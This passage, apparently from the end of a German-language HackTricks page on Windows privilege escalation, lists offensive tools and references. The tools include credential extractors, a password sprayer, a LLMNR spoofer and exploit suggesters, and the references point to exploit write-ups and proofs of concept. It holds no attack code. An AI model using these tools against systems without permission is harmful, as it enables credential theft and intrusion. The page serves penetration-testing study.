[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt Password Spraying mit gesammelten Passwörtern über die Domäne aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfaches Windows-Enumerationstool für Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET, Watson wird empfohlen)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Adminrechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus vielen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ein auf diesem Beitrag basierendes Tool (benötigt für die ordnungsgemäße Funktion kein accesschk, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilegienerhöhung durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zu Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Windows Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Zugangsdaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + Stack-BOF → VirtualAlloc-ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Auf der Spur des Silver Fox: Katz-und-Maus-Spiel in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit. Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++-Checklist-Herausforderungen, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitiv unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Ausnutzen beliebiger Dateilöschungen zur Rechteausweitung und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day-Schwachstelle](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zur Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extrahieren privater SSH-Schlüssel aus dem Windows-10-SSH-Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
